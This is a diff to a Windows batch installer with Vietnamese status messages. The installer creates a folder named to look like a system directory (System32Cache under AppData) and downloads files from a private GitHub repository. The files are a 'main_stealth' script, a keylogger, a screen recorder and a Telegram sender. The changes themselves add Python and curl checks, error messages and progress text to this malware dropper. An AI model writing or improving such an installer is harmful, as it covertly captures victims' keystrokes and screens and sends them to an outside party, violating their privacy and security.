@@ -34,6 +34,10 @@ python --version >nul 2>&1
 if errorlevel 1 (
     py --version >nul 2>&1
     if errorlevel 1 (
+        echo [ERROR] Python chua duoc cai dat!
+        echo Vui long cai dat Python tu https://www.python.org/downloads/
+        echo.
+        pause
         exit /b 1
     ) else (
         set "PYTHON_CMD=py"
@@ -41,6 +45,7 @@ if errorlevel 1 (
 ) else (
     set "PYTHON_CMD=python"
 )
+echo [OK] Tim thay Python
 
 REM Tạo thư mục cài đặt
 set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache"
@@ -49,9 +54,26 @@ if not exist "%INSTALL_DIR%\temp" mkdir "%INSTALL_DIR%\temp" >nul 2>&1
 
 cd /d "%INSTALL_DIR%" >nul 2>&1
 
+REM Kiểm tra curl
+curl --version >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] Curl chua duoc cai dat!
+    echo Windows 10/11 co san curl, neu khong co vui long cai dat.
+    pause
+    exit /b 1
+)
+
 REM Tải tất cả file từ GitHub Private Repo
 echo [1/5] Dang tai file tu GitHub...
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o main_stealth.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py" >nul 2>&1
+echo Dang tai main_stealth.py...
+curl -L -H "Authorization: token %GITHUB_TOKEN%" -o main_stealth.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py"
+if errorlevel 1 (
+    echo [ERROR] Khong the tai file tu GitHub!
+    echo Kiem tra lai GITHUB_TOKEN hoac ket noi internet.
+    pause
+    exit /b 1
+)
+echo Dang tai cac file khac...
 curl -L -H "Authorization: token %GITHUB_TOKEN%" -o screen_recorder.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/screen_recorder.py" >nul 2>&1
 curl -L -H "Authorization: token %GITHUB_TOKEN%" -o keylogger.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/keylogger.py" >nul 2>&1
 curl -L -H "Authorization: token %GITHUB_TOKEN%" -o telegram_sender.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/telegram_sender.py" >nul 2>&1
